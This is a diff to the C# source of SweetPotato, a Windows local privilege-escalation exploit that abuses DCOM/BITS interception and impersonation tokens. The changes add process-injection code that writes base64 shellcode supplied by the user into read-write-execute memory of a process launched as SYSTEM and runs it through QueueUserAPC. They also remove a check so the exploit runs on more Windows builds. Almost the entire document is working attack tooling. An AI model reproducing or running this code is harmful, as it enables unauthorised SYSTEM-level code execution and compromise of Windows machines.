@@ -8,14 +8,68 @@ using static SweetPotato.ImpersonationToken;
 
 namespace SweetPotato {
     class Program {
-        #region shellcode inject
-        private static UInt32 MEM_COMMIT = 0x1000;
-        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR  ;-)
-        private static UInt32 PAGE_READWRITE = 0x04;
-        private static UInt32 PAGE_EXECUTE_READ = 0x20;
 
-        [Flags]
-        public enum ProcessAccessFlags : uint
+        #region shellcode inject
+        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
+        public enum ThreadAccess : int
+        {
+            TERMINATE = (0x0001),
+            SUSPEND_RESUME = (0x0002),
+            GET_CONTEXT = (0x0008),
+            SET_CONTEXT = (0x0010),
+            SET_INFORMATION = (0x0020),
+            QUERY_INFORMATION = (0x0040),
+            SET_THREAD_TOKEN = (0x0080),
+            IMPERSONATE = (0x0100),
+            DIRECT_IMPERSONATION = (0x0200),
+            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
+            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
+        }
+        public enum MemProtect
+        {
+            PAGE_EXECUTE = 0x10,
+            PAGE_EXECUTE_READ = 0x20,
+            PAGE_EXECUTE_READWRITE = 0x40,
+            PAGE_EXECUTE_WRITECOPY = 0x80,
+            PAGE_NOACCESS = 0x01,
+            PAGE_READONLY = 0x02,
+            PAGE_READWRITE = 0x04,
+            PAGE_WRITECOPY = 0x08,
+            PAGE_TARGETS_INVALID = 0x40000000,
+            PAGE_TARGETS_NO_UPDATE = 0x40000000,
+        }
+        public enum MemAllocation
+        {
+            MEM_COMMIT = 0x00001000,
+            MEM_RESERVE = 0x00002000,
+            MEM_RESET = 0x00080000,
+            MEM_RESET_UNDO = 0x1000000,
+            SecCommit = 0x08000000
+        }
+
+        public enum ProcessAccessRights
         {
             All = 0x001F0FFF,
             Terminate = 0x00000001,
@@ -31,114 +85,28 @@ namespace SweetPotato {
             QueryLimitedInformation = 0x00001000,
             Synchronize = 0x00100000
         }
-
-        [Flags]
-        public enum ProcessCreationFlags : uint
-        {
-            ZERO_FLAG = 0x00000000,
-            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
-            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
-            CREATE_NEW_CONSOLE = 0x00000010,
-            CREATE_NEW_PROCESS_GROUP = 0x00000200,
-            CREATE_NO_WINDOW = 0x08000000,
-            CREATE_PROTECTED_PROCESS = 0x00040000,
-            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
-            CREATE_SEPARATE_WOW_VDM = 0x00001000,
-            CREATE_SHARED_WOW_VDM = 0x00001000,
-            CREATE_SUSPENDED = 0x00000004,
-            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
-            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
-            DEBUG_PROCESS = 0x00000001,
-            DETACHED_PROCESS = 0x00000008,
-            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
-            INHERIT_PARENT_AFFINITY = 0x00010000
-        }
-        /*
-        public struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public uint dwProcessId;
-            public uint dwThreadId;
-        }
-        public struct STARTUPINFO
-        {
-            public uint cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public uint dwX;
-            public uint dwY;
-            public uint dwXSize;
-            public uint dwYSize;
-            public uint dwXCountChars;
-            public uint dwYCountChars;
-            public uint dwFillAttribute;
-            public uint dwFlags;
-            public short wShowWindow;
-            public short cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-        */
-        [Flags]
-        public enum ThreadAccess : int
-        {
-            TERMINATE = (0x0001),
-            SUSPEND_RESUME = (0x0002),
-            GET_CONTEXT = (0x0008),
-            SET_CONTEXT = (0x0010),
-            SET_INFORMATION = (0x0020),
-            QUERY_INFORMATION = (0x0040),
-            SET_THREAD_TOKEN = (0x0080),
-            IMPERSONATE = (0x0100),
-            DIRECT_IMPERSONATION = (0x0200)
-        }
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
-            int dwThreadId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool WriteProcessMemory(
-            IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            byte[] lpBuffer,
-            int nSize,
-            out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
-
-        [DllImport("kernel32")]
-        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
-             Int32 size, UInt32 flAllocationType, UInt32 flProtect);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
-        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr OpenProcess(
-         ProcessAccessFlags processAccess,
-         bool bInheritHandle,
-         int processId
-        );
-
-        [DllImport("kernel32.dll")]
-        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-        [DllImport("kernel32.dll")]
-        public static extern uint ResumeThread(IntPtr hThread);
-        [DllImport("kernel32.dll")]
-        public static extern uint SuspendThread(IntPtr hThread);
-        [DllImport("kernel32.dll")]
-        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
-        int dwSize, uint flNewProtect, out uint lpflOldProtect);
         #endregion
-        
         static void PrintHelp(OptionSet options) {                
             options.WriteOptionDescriptions(Console.Out);
+        }
+
+        public static string HKLM_GetString(string path, string key) {
+            try {
+                RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
+                if (rk == null) return "";
+                return (string)rk.GetValue(key);
+            } catch { return ""; }
+        }
+
+        //https://stackoverflow.com/questions/6331826/get-os-version-friendly-name-in-c-sharp
+        public static string FriendlyName() {
+            string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
+            string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
+            if (ProductName != "") {
+                return (ProductName.StartsWith("Microsoft") ? "" : "Microsoft ") + ProductName +
+                            (CSDVersion != "" ? " " + CSDVersion : "");
+            }
+            return "";
         }
 
         static bool IsBITSRequired() {
@@ -147,10 +115,13 @@ namespace SweetPotato {
                 return false;
             }
 
+            string friendlyName = FriendlyName();
+
             RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
             var buildNumber = UInt32.Parse(registryKey.GetValue("ReleaseId").ToString());
 
-            if(buildNumber <= 1809) {
+            if( (buildNumber <= 1809 && friendlyName.Contains("Windows 10")) ||
+                buildNumber < 1809 && friendlyName.Contains("Windows Server")){
                 return false;
             }
 
@@ -168,12 +139,17 @@ namespace SweetPotato {
             bool isBITSRequired = false;
 
             Console.WriteLine(
-                "[+] SweetPotato by @_EthicalChaos_,fixed by 2020/4/16\n");
+                "Modifying SweetPotato by Uknow to support load shellcode \n" +
+                "Github: https://github.com/uknowsec/SweetPotato \n" +
+                "SweetPotato by @_EthicalChaos_\n" +
+                 "  Orignal RottenPotato code and exploit by @foxglovesec\n" +
+                 "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n"
+                );
 
             OptionSet option_set = new OptionSet()
                 .Add<string>("c=|clsid=", "CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)", v => clsId = v)
                 .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
-                .Add("p=|prog=", "Run a Process (werfault.exe)", v => program = v)
+                .Add("p=|prog=", "Program to launch (default werfault.exe)", v => program = v)
                 .Add("s=|shellcode=", "Arguments for program (default null)", v => shellcode = v)
                 .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
@@ -198,7 +174,6 @@ namespace SweetPotato {
                 if ( isBITSRequired = IsBITSRequired()) {
                     clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
                     Console.WriteLine("[=] Your version of Windows fixes DCOM interception forcing BITS to perform WinRM intercept");
-                    return;
                 }
 
                 bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
@@ -248,43 +223,41 @@ namespace SweetPotato {
                     Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);
 
                     string finalArgs = null;
-                    /*
-                    if(shellcode != null)
-                        finalArgs = string.Format("\"{0}\" {1}", program, args);
-                    */
+
                     if (executionMethod == ExecutionMethod.Token) {
-                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.Suspended, IntPtr.Zero, null, ref si, out pi)) {
+                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {
                             Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                             return;
                         }
                     } else {
                         if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
-                            IntPtr.Zero, false, 0x00000004, IntPtr.Zero, @"C:\", ref si, out pi)) {
+                            IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @"C:\", ref si, out pi)) {
                             Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());
                             return;
                         }
                     }
                     byte[] b_shellcode = Convert.FromBase64String(shellcode);
-                    //byte[] shellcode = new byte[112] {0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3};
-                    // Allocate memory within process and write shellcode
-                    IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, b_shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
-                    IntPtr bytesWritten = IntPtr.Zero;
-                    //Marshal.Copy(b_shellcode, 0, resultPtr, b_shellcode.Length);
-                    bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, b_shellcode, b_shellcode.Length, out bytesWritten);
+                    uint lpNumberOfBytesWritten = 0;
+                    IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pi.dwProcessId);
+                    Console.WriteLine(String.Format(@"[+] OpenProcess Pid: {0}", pi.dwProcessId.ToString()));
+                    IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)b_shellcode.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+                    Console.WriteLine(@"[+] VirtualAllocEx Success");
+                    if (WriteProcessMemory(pHandle, rMemAddress, b_shellcode, (uint)b_shellcode.Length, ref lpNumberOfBytesWritten))
+                    {
 
-                    // Open thread
-                    IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
-                    uint oldProtect = 0;
+                        IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)pi.dwThreadId);
 
-                    // Modify memory permissions on allocated shellcode
-                    resultBool = VirtualProtectEx(pi.hProcess, resultPtr, b_shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+                        IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
 
-                    // Assign address of shellcode to the target thread apc queue
-                    IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);
-
-                    IntPtr ThreadHandle = pi.hThread;
-                    ResumeThread(ThreadHandle);
-                    Console.WriteLine("[+] Process created, enjoy!");
+                        ResumeThread(tHandle);
+                        Console.WriteLine(String.Format(@"[+] QueueUserAPC Inject shellcode to PID: {0} Success", pi.dwProcessId.ToString()));
+                    }
+                    bool hOpenProcessClose = CloseHandle(pHandle);
+                    if (hOpenProcessClose)
+                    {
+                        Console.WriteLine(@"[+] hOpenProcessClose Success");
+                    }
+                    Console.WriteLine("\n\n[*] QueueUserAPC Inject shellcode Success, enjoy!");
                 });
 
                 systemThread.Start();
